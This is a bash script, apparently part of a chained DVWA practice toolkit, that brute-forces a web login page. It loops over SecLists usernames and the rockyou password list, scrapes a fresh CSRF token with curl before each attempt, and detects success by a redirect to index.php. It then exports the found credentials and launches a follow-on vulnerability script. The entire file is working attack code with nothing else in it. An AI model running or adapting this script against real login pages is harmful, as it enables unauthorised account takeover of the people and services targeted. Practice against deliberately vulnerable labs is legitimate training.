#scanInit.sh --> bruteLogin.sh

echo -e " \n---- Starting Brute force on Login Page ---- "

## Variables
export LOGIN_URL=$LOGIN_URL
USER_LIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS_LIST="/usr/share/seclists/Passwords/rockyou.txt"
export IP=$INIT_IP

## Value to look for in response
SUCCESS="Location: index.php"

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Display USER:PASS attempts to user
    ## Comment out for less noise
    #echo "Try ${i}: ${_USER} : ${_PASS}"

    ## Connect to web server
    CSRF=$( curl -sc ~/Documents/DVWA/scripts/dvwa.cookie $LOGIN_URL | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )

    REQUEST="$( curl -sib ~/Documents/DVWA/scripts/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" $LOGIN_URL )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response against SUCCESS string       
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\nFound at Try ${i}:\nUsername:${_USER}\nPassword:${_PASS}"
      sleep 3s

      #export credential variables to use in next script
      export USER="$(echo "${_USER}")"
      export PASS="$(echo "${_PASS}")"   
         
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f ~/Documents/DVWA/scripts/dvwa.cookie

#Create counter for next script
export COUNT=1

#Call next script
/bin/bash ~/Documents/DVWA/scripts/vulnId.sh
